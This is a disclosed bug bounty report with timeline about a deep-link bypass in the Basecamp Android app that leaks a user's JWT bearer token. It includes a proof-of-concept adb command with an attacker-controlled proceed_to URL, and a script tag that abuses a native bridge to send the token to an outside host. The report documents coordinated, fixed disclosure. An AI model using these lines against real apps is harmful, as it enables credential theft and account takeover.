---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
  - vuln/xss
  - vuln/jwt
  - impact/credential-theft
  - trigger/social-engineering
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2022-03-27
submitted: 2021-10-17T19:46:30.909Z
bounty_usd: 6337
votes: 110
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "danielllewellyn"
source: "https://hackerone.com/reports/1372667"
title: "Able to steal bearer token from deep link"
---
# Able to steal bearer token from deep link

> **Severity:** High | **Bounty:** 6,337 USD | **Votes:** 110 | **Program:** Basecamp | **Disclosed:** 2022-03-27

- Report: [https://hackerone.com/reports/1372667](https://hackerone.com/reports/1372667)
- CWE: Improper Authentication - Generic
- Submitted: 2021-10-17T19:46:30.909Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

# Pre-requisities

Prior to exploitation you would be required to know the "account id" of the user that you are attacking. Whilst this makes it difficult to attack an application in a generic way - the account is not secret information as it is included in any links to a user's basecamp organisation. E.g

https://3.basecamp.com/5218370/

# Attack

The attack involves forcing the user to enter the application either by starting an intent from an application on the device already, or by triggering a deep link (which can be done by with e.g. a phishing email) . The link should be in this format:

https://3.basecamp.com/<accountId>/verify?proceed_to=<attacker controlled URL>

Here is a sample adb command that can be used to test the attack:

```sh
adb shell am start -n com.basecamp.bc3/com.basecamp.bc3.activities.BasecampUrlFilterActivity https://3.basecamp.com/5218370/verify?proceed_to=https://haystack-production-storage.s3.eu-west-2.amazonaws.com/attack.html
```

The second part of the attack involves redirecting someone using the turbo links API that is exposed through the javascript native bridge. Here is the example:

```js
<script>NativeApp.openNativeImageViewer("[{'download_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'preview_url': 'https://us-central1-andro-3982e.cloudfunctions.net/home/5218370/image.jpg', 'caption':'ViewImage'}]", 0)</script>
```

This script executes 'openNativeImageViewer' and passes the download_url and preview_url. The preview_url is the most interesting, as it requires not user interaction. In order to render a preview image, the basecamp app sends the JWT header to the site, meaning that the 'preview_url' will receive that header.

# Vulnerability

The clearest vulnerability is that the check to determine if a URL is an 'internal' URL allows it to by bypassed in a limited way by using the /verify? url along with a proceed_to that is attacker controlled. 

```java
if (TuroblinksUrlHandler.contains(url, "/verify?", true)) {
                C3982h.nullCheck(url, "$this$proceedToParam");
                C3982h.nullCheck(url, "$this$extractQueryParam");
                C3982h.nullCheck("proceed_to", "queryKey");
                String queryParameter = url.toUri().getQueryParameter("proceed_to");
                url = queryParameter != null ? UrlKt.parseUrl(queryParameter) : null;
                C3982h.nullCheck(url);
            }

 Intent intent10 = new Intent(context, WebViewActivity.class);
                    C1071a.addUrlsToIntent(url, intent10, "intentUrl", "intentApiUrl", null);
                    return intent10;
```

## Impact

An attacker could, without physical access to the device, retrieve a user's authentication tokens. A potentially compounding factor is that once a user has been exploited, it might be possible to continue the chain of attack by having that compromised user share links with other users who trust links sent by the compromised user.

## Timeline

- **Report Filed**
- **2021-10-20** @jorgemanrubia: Thanks for your report @danielllewellyn. We'll look into this and get back to you tomorrow.
- **2021-10-22** @danielllewellyn: Great, thanks. Let me know if you need any more info
- **2021-10-22** @raul-at-basecamp: Hello @danielllewellyn ! I'm sharing your report with our mobile team, they'll get back to you once they've looked into it. Thank you again!
- **2021-10-27** @danielllewellyn: Hi, do you have any update or do you need anything else from me?
- **2021-10-28** @lewispb: Sorry for the delay here in getting back to you @danielllewellyn. The issue is currently waiting on our mobile team to investigate and as soon as they've done that, we'll be in contact.
- **2021-11-02** @jeremy: Update: still in a holding pattern for investigation. Thank you for your patience on triage; we're short-staffed at the moment.
- **2021-11-02** @danielllewellyn: Hey, no worries - really appreciate the update thanks
- **2021-11-08** @jeremy: Update: same status, same reason. Thank you again for your patience on this triage step.
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2021-11-15** @danielllewellyn: Great, thanks for getting back to me - and thanks a lot for the bounty!
- **2022-01-16** @danielllewellyn: Hi, are we able to close this off so I can request disclosure?

Thanks,
Dan
- **2022-01-18** @lewispb: Hi @danielllewellyn, thanks for your patience here. I've checked in with our mobile team and they still haven't got to this yet. So we'd appreciate holding off on closing this for now. Sorry for the delay, we'll be in touch soon.
- **2022-02-01** @lewispb: I can confirm a fix for this issue has been included in the latest version of the Android app. Would you mind verifying that that fix addresses the vulnerability @danielllewellyn before I mark this report as resolved? Thanks!
- **2022-02-09** @danielllewellyn: Hi, yep looks good to me

Thanks
Dan
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
